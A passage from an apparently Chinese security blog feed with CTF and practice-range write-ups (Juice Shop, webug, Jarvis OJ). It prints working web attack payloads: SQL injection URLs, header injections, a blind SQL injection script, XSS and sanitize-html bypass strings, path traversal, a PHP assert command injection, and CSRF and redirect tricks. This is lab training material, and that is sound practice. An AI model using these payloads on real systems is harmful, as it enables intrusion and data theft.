token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqo</span><br><span class="line">X-Forwarded-For: 127.0.0.1, 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Reque</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"name"</span>: <span class="string">"XSS3"</span>, <span class="string">"description"</span>: <span class="string">"&lt;script&gt;alert(\"XSS\")&lt;/script&gt;"</span>, <span class="string">"price"</span>: 47.11&#125;</span><br></pre></td></tr></table></figure></p><h2 id="XXE-Tier-1"><a href="#XXE-Tier-1" class="headerlink" title="XXE Tier 1"></a>XXE Tier 1</h2><h1 id="四颗星"><a href="#四颗星" class="headerlink" title="四颗星"></a>四颗星</h1><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>万能密码登入 ，通过bp抓包，可删除现有的current的，即可。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /rest/user/change-password?current=4567\89\76&amp;new=123456&amp;repeat=123456</span><br></pre></td></tr></table></figure></p><h2 id="Easter-Egg-Tier-2"><a href="#Easter-Egg-Tier-2" class="headerlink" title="Easter Egg Tier 2"></a>Easter Egg Tier 2</h2><h2 id="JWT-Issues-Tier-1"><a href="#JWT-Issues-Tier-1" class="headerlink" title="JWT Issues Tier 1"></a>JWT Issues Tier 1</h2><h2 id="Login-CISO"><a href="#Login-CISO" class="headerlink" title="Login CISO"></a>Login CISO</h2><h2 id="Redirects-Tier-2"><a href="#Redirects-Tier-2" class="headerlink" title="Redirects Tier 2"></a>Redirects Tier 2</h2><p>在<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ redirect？to = https：//github.com/bkimminich/juice-shop。</span><br></pre></td></tr></table></figure></p><p>有个重定向。<br>尝试重定向到一些无法识别的URL会因白名单验证而失败406 Error: Unrecognized target URL for redirect。<br>卸下to参数（HTTP：//本地主机：3000 /重定向）将转而产生500 TypeError: Cannot read property ‘indexOf’ of undefined，其中indexOf表示在这样的白名单中的作品严重的缺陷。<br>制作重定向网址，以便目标网址to带有包含白名单网址的自己的参数，例如<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/redirect?to=http://www.baidu.com?pwned=https://github.com/bkimminich/juice-shop</span><br></pre></td></tr></table></figure></p><p>通过忘记密码机制重置本德的密码</p><h2 id="Reset-Bjoern’s-Password"><a href="#Reset-Bjoern’s-Password" class="headerlink" title="Reset Bjoern’s Password"></a>Reset Bjoern’s Password</h2><h2 id="Typosquatting-Tier-2"><a href="#Typosquatting-Tier-2" class="headerlink" title="Typosquatting Tier 2"></a>Typosquatting Tier 2</h2><h2 id="XSS-Tier-4"><a href="#XSS-Tier-4" class="headerlink" title="XSS Tier 4"></a>XSS Tier 4</h2><p>里就利用sanitize-html这个版本的漏洞，编号为CVE-2016-1000237，用google搜索。根据该版本的特征通过不递归绕过验证。在评论处，构造语句&lt;<script>4</script>script&gt;alert(“XSS”)&lt;/script&gt;</p><h2 id="XXE-Tier-2"><a href="#XXE-Tier-2" class="headerlink" title="XXE Tier 2"></a>XXE Tier 2</h2><p>感觉挺无聊的，等以后有空再玩。<br><br>参考文章<br><br><a href="https://github.com/bkimminich/pwning-juice-shop/blob/master/appendix/solutions.md" target="_blank" rel="noopener">https://github.com/bkimminich/pwning-juice-shop/blob/master/appendix/solutions.md</a></p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞    </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>webug 靶场</title>
      <link href="/posts/523c96b0.html"/>
      <url>/posts/523c96b0.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这个靶场不错，可惜的是有些题目复现不出来，有些小问题。<br><a id="more"></a></p><h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><h2 id="普通的get注入"><a href="#普通的get注入" class="headerlink" title="普通的get注入"></a>普通的get注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.3.129/pentest/<span class="built_in">test</span>/sqli/sqltamp.php?gid=1<span class="string">' order by 4 %23</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.3.129/pentest/<span class="built_in">test</span>/sqli/sqltamp.php?gid=1<span class="string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4%23</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.3.129/pentest/<span class="built_in">test</span>/sqli/sqltamp.php?gid=1<span class="string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C6167),4%23</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.3.129/pentest/<span class="built_in">test</span>/sqli/sqltamp.php?gid=1<span class="string">' union select 1,2,(select group_concat(flag) from flag),4%23</span></span><br></pre></td></tr></table></figure><h2 id="从图片中找到有用的信息"><a href="#从图片中找到有用的信息" class="headerlink" title="从图片中找到有用的信息"></a>从图片中找到有用的信息</h2><p>只能看到123.txt, 此题有点问题</p><h2 id="你看到了什么"><a href="#你看到了什么" class="headerlink" title="你看到了什么"></a>你看到了什么</h2><p>给了一个假的flag。<br><br>用御剑扫一下网站<br><br>找到test目录，提示说尝试将目录MD5加密一下，将其加密，再访问<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(<span class="built_in">test</span>,32) = 098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">md5(<span class="built_in">test</span>,16) = 4621d373cade4e83</span><br></pre></td></tr></table></figure></p><p>第二个md5加密访问，得到flag</p><h2 id="告诉你了FLANG是五位数"><a href="#告诉你了FLANG是五位数" class="headerlink" title="告诉你了FLANG是五位数"></a>告诉你了FLANG是五位数</h2><p>弱口令admin admin123尝试登入成功</p><h2 id="一个优点小小的特殊的注入"><a href="#一个优点小小的特殊的注入" class="headerlink" title="一个优点小小的特殊的注入"></a>一个优点小小的特殊的注入</h2><p>X-Forwarded-For的一个注入，用bp抓包，将X-Forwarded-For:后面的额数据删除掉，显示出正确的答案。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:order by 4 %23</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:union select 1,2,3,4 %23</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:union select 1,2,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),4 %23</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:union select 1,2,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x666C6167),4 %23</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:union select 1,2,(select group_concat(flag) from flag),4 %23</span><br></pre></td></tr></table></figure><h2 id="这关需要RMB购买"><a href="#这关需要RMB购买" class="headerlink" title="这关需要RMB购买"></a>这关需要RMB购买</h2><p>一开始有一个登入框，直接查看源码，发现可以直接访问后台连接，出现买书页面。<br>支付逻辑问题，抓包后将价格改为负数，会提示不能白白拿书，将价格都改为0，购买成功.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bill1=0&amp;bill2=0&amp;num1=10&amp;num2=10&amp;uid=1</span><br></pre></td></tr></table></figure></p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>用给的账户登入，修改密码的之后，bp抓包，将用户名改成admin，修改admin密码成功<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password1=123&amp;password2=123&amp;password3=123</span><br></pre></td></tr></table></figure></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>用上一关的账号名登录，修改密码，bp抓包生成csrf界面，将此保存为html 管理员打开后就会更改其密码了 完成了CSRF</p><h2 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h2><p>熟悉的界面，查看源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--&lt;a href=<span class="string">"index.php?url=#"</span>&gt;I&lt;/a&gt;--&gt;</span><br></pre></td></tr></table></figure></p><p>构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?url=www.baidu.com</span><br></pre></td></tr></table></figure></p><p>成功跳转</p><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>后台出了点小问题,此题是任意文件下载</p><h2 id="我和上题有点像"><a href="#我和上题有点像" class="headerlink" title="我和上题有点像"></a>我和上题有点像</h2><p>此题也是任意文件下载，不过这题是post方式下载。<br>post请求<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pic=../../../pentest/<span class="built_in">test</span>/7/1/db/config.php&amp;submit=%E4%B8%8B%E8%BD%BD</span><br></pre></td></tr></table></figure></p><h2 id="我系统密码忘记了"><a href="#我系统密码忘记了" class="headerlink" title="我系统密码忘记了"></a>我系统密码忘记了</h2><p>上传一句话，这里我上传了一句话，但是连接的时候却出现连接不上，有点怪。<br>连接上了，就可以利用mimikatz读取管理员的账户密码了</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>点击页面上的666,连接上的666，显示在页面上，反射性xss,直接在id=后面加上xss语句即可。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.3.129/pentest/<span class="built_in">test</span>/9/?id=%3Cscript%3Ealert(%27qianye%27)%3C/script%3E</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.3.129/pentest/<span class="built_in">test</span>/9/?id=&lt;img src onerror=alert(<span class="string">'qianye'</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>在输入框中输入上面的xss语句即可。</p><h2 id="什么？上传不了图片"><a href="#什么？上传不了图片" class="headerlink" title="什么？上传不了图片"></a>什么？上传不了图片</h2><p>先正常上传一张jpg图片,然后抓包,将jpg后缀修改为php,过关。</p><h2 id="明天双十一"><a href="#明天双十一" class="headerlink" title="明天双十一"></a>明天双十一</h2><p>看别人的writeup说有源码，但表示查看源码时什么都没有，有点问题。看一下别人的源码，只要修改url,x-forwarded-for,referer就可以啦<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /pentest/<span class="built_in">test</span>/12/?url=www.taobao.com HTTP/1.1</span><br><span class="line">Host: 192.168.3.129</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.3.129/pentest/<span class="built_in">test</span>/12/</span><br><span class="line">Cookie: PHPSESSID=eh6c536efhrbjh9tbfupi72sd0</span><br><span class="line">X-Forwarded-For: 10.10.10.10</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Referer:  www.baidu.com</span><br></pre></td></tr></table></figure></p><h1 id="中级进阶"><a href="#中级进阶" class="headerlink" title="中级进阶"></a>中级进阶</h1><h2 id="出来一点东西"><a href="#出来一点东西" class="headerlink" title="出来一点东西"></a>出来一点东西</h2><p>这道题本身有点问题，不过知道是任意文件读取就行啦。读取boot.int,试一下，可以成功<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.3.129/pentest/<span class="built_in">test</span>/13/?country=../../../../../../boot.ini</span><br></pre></td></tr></table></figure></p><h2 id="提交方式是什么样的"><a href="#提交方式是什么样的" class="headerlink" title="提交方式是什么样的"></a>提交方式是什么样的</h2><p>任意文件读取，变成post方式</p><h2 id="我还是一个注入"><a href="#我还是一个注入" class="headerlink" title="我还是一个注入"></a>我还是一个注入</h2><p>查看后台源码，才知道是host注入。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host:  order by  4</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host:  union select 1,2,3,4</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host:  union select 1,2,3,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host:  union select 1,2,3,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x666C6167</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host:  union select 1,2,3,flag from flag</span><br></pre></td></tr></table></figure><h2 id="看看pak"><a href="#看看pak" class="headerlink" title="看看pak"></a>看看pak</h2><p>逆向题不懂</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>运行有点卡，附上脚本自己试一下吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:'utf-8'</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">payloads=string.printable</span><br><span class="line">length=0</span><br><span class="line">result=<span class="string">''</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'start'</span>)</span><br><span class="line"><span class="comment"># 判断长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,33):</span><br><span class="line">    startTime=time.time()</span><br><span class="line">    url=<span class="string">"http://192.168.3.129/pentest/test/time/?type=2 and if(length(database())=%d,sleep(5),1)"</span>%(i)</span><br><span class="line">    <span class="comment">#url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat(table_name) from information_schema.tables where table_schema=database())=%d,sleep(5),1)"%(i)</span></span><br><span class="line">    <span class="comment">#url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat(column_name) from information_schema.columns where table_schema= )=%d,sleep(5),1)"%(i)</span></span><br><span class="line">    <span class="comment">#url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat() from )=%d,sleep(5),1)"%(i)</span></span><br><span class="line">    response=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> time.time()-startTime &gt;=5:</span><br><span class="line">        length=i</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"the database length is"</span>+str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"start brute sql"</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,length+1):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> payloads:</span><br><span class="line">        startTime1=time.time()</span><br><span class="line">        url1=<span class="string">"http://192.168.3.129/pentest/test/time/?type=2 and if(substr(database(),'%d',1)='%s',sleep(5),1)"</span>%(j,k)</span><br><span class="line">        <span class="comment">#url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),'%d',1)='%s',sleep(5),1)"%(j,k)</span></span><br><span class="line">        <span class="comment">#url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(select group_concat(column_name) from information_schema.columns where table_name= ,'%d',1)='%s',sleep(5),1)"%(j,k)</span></span><br><span class="line">        <span class="comment">#url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(select group_concat() from ,'%d',1)='%s',sleep(5),1)"%(j,k)</span></span><br><span class="line">        response1=requests.get(url1)</span><br><span class="line">        <span class="keyword">if</span> time.time()-startTime1 &gt;=5:</span><br><span class="line">            result+=k</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"result is:"</span>+result)</span><br></pre></td></tr></table></figure><h2 id="DZ论坛"><a href="#DZ论坛" class="headerlink" title="DZ论坛"></a>DZ论坛</h2><p>复现失败</p><h2 id="aspcms"><a href="#aspcms" class="headerlink" title="aspcms"></a>aspcms</h2><p>复现失败</p><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>jarvis oj web</title>
      <link href="/posts/d4a99024.html"/>
      <url>/posts/d4a99024.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">jarvis oj</a> 挺不错的ctf平台，有点难。</p><a id="more"></a><h1 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h1><p><a href="http://blog.csdn.net/qq_31481187/article/details/73699167" target="_blank" rel="noopener">某大佬的解</a></p><h1 id="basyphp"><a href="#basyphp" class="headerlink" title="basyphp"></a>basyphp</h1><p>从about中猜测是有git源码泄露，用githacker，得到泄露部分<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'page'</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">"templates/"</span> . <span class="variable">$page</span> . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('<span class="variable">$file</span>', '..') === false"</span>) or die(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('<span class="variable">$file</span>')"</span>) or die(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>从源码中知道有命令执行漏洞，构造</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32798/?page=?page=<span class="string">'.system("tac templates/flag.php").'</span></span><br></pre></td></tr></table></figure><h1 id="register"><a href="#register" class="headerlink" title="register"></a>register</h1><p>二次注入</p><h1 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h1><p>输入index.php~<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php~</span><br></pre></td></tr></table></figure></p><p>得到源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>]?<span class="variable">$_GET</span>[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line"><span class="variable">$table</span> = Filter(<span class="variable">$table</span>);</span><br><span class="line">mysqli_query(<span class="variable">$mysqli</span>,<span class="string">"desc `secret_&#123;<span class="variable">$table</span>&#125;`"</span>) or Hacker();</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;<span class="variable">$table</span>&#125;"</span>;</span><br><span class="line"><span class="variable">$ret</span> = sql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$ret</span>[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>在desc <code>secret_test</code> <code>表名</code><br>只要第一组反引号中的表名存在，第二组反引号中随便写都不会报错.<br><br>爆数据库<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/?table=<span class="built_in">test</span>` `union select GROUP_CONCAT(schema_name) from information_schema.schemata <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure></p><p>爆表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/?table=<span class="built_in">test</span>` `union select GROUP_CONCAT(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=0x363164333030 <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure></p><p>爆列名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?table=<span class="built_in">test</span>` `union select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x7365637265745f666c6167 <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure></p><p>脱裤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/?table=<span class="built_in">test</span>` `union select flagUwillNeverKnow from secret_flag <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure></p><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>从robots.txt 中，范文不允许访问的路径，即可得到flag</p><h1 id="web"><a href="#web" class="headerlink" title="web?"></a>web?</h1><p>根据输入的Wrong Password!! 在app.js中定位到如下 js代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$.post(<span class="string">"checkpass.json"</span>,t,<span class="keyword">function</span>(t)&#123;</span><br><span class="line">self.checkpass(e)?self.setState(&#123;</span><br><span class="line">errmsg:<span class="string">"Success!!"</span>,</span><br><span class="line">errcolor:b.green400</span><br><span class="line">&#125;):(self.setState(&#123;</span><br><span class="line">errmsg:<span class="string">"Wrong Password!!"</span>,</span><br><span class="line">errcolor:b.red400</span><br><span class="line">&#125;),setTimeout(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">self.setState(&#123;</span><br><span class="line">errmsg:<span class="string">""</span></span><br><span class="line">&#125;)</span><br><span class="line">  &#125;,3e3))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>有个checkpass(e)，定位到该处得到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r.checkpass=<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">var e;</span><br><span class="line"><span class="built_in">return</span>(e=r).__checkpass__REACT_HOT_LOADER__.apply(e,arguments)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现一个线性方程<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;key:<span class="string">"__checkpass__REACT_HOT_LOADER__"</span>,</span><br><span class="line">value:<span class="keyword">function</span>(e)&#123;</span><br><span class="line"><span class="keyword">if</span>(25!==e.length)</span><br><span class="line"><span class="built_in">return</span>!1;</span><br><span class="line"><span class="keyword">for</span>(var t=[],n=0;n&lt;25;n++)</span><br><span class="line">t.push(e.charCodeAt(n));</span><br><span class="line"><span class="keyword">for</span>(var r=[325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259],</span><br><span class="line">o=[[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135],</span><br><span class="line">   [76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221],</span><br><span class="line">   [218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230],</span><br><span class="line">   [30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80],</span><br><span class="line">   [134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45],</span><br><span class="line">   [142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107],</span><br><span class="line">   [229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249],</span><br><span class="line">   [235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158],</span><br><span class="line">   [37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98],</span><br><span class="line">   [199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141],</span><br><span class="line">   [212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119],</span><br><span class="line">   [194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94],</span><br><span class="line">   [110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208],</span><br><span class="line">   [220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196],</span><br><span class="line">   [190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40],</span><br><span class="line">   [144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123],</span><br><span class="line">   [158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236],</span><br><span class="line">   [251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119],</span><br><span class="line">   [192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196],</span><br><span class="line">   [106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66],</span><br><span class="line">   [154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214],</span><br><span class="line">   [193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212],</span><br><span class="line">   [164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235],</span><br><span class="line">   [221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156],</span><br><span class="line">   [236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]],</span><br><span class="line">n=0;n&lt;25;n++)&#123;</span><br><span class="line"><span class="keyword">for</span>(var i=0,a=0;a&lt;25;a++)</span><br><span class="line">i+=t[a]*o[n][a];</span><br><span class="line"><span class="keyword">if</span>(i!==r[n])</span><br><span class="line"><span class="built_in">return</span>!1</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span>!0</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用py去接，两个线性方程相乘，取整然后，在转换成字符串拼接起来即可。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.linalg import solve</span><br><span class="line">import string</span><br><span class="line">r=np.array([325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259])</span><br><span class="line">o=np.array([[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135],</span><br><span class="line">   [76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221],</span><br><span class="line">   [218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230],</span><br><span class="line">   [30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80],</span><br><span class="line">   [134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45],</span><br><span class="line">   [142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107],</span><br><span class="line">   [229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249],</span><br><span class="line">   [235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158],</span><br><span class="line">   [37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98],</span><br><span class="line">   [199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141],</span><br><span class="line">   